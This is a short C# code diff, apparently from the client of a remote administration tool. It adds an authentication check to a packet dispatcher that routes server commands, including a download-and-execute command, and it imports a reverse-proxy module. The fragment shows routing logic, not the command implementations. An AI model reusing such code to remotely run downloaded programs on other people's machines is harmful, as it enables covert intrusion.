@@ -1,4 +1,5 @@
 ﻿using xClient.Core.Commands;
+using xClient.Core.Data;
 using xClient.Core.Networking;
 using xClient.Core.ReverseProxy;
 
@@ -10,11 +11,20 @@ namespace xClient.Core.Packets
         {
             var type = packet.GetType();
 
-            if (type == typeof(ServerPackets.GetAuthentication))
+            if (!ClientData.IsAuthenticated)
             {
-                CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
+                if (type == typeof(ServerPackets.GetAuthentication))
+                {
+                    CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
+                }
+                else if (type == typeof(ServerPackets.SetAuthenticationSuccess))
+                {
+                    ClientData.IsAuthenticated = true;
+                }
+                return;
             }
-            else if (type == typeof(ServerPackets.DoDownloadAndExecute))
+
+            if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
                 CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
                     client);
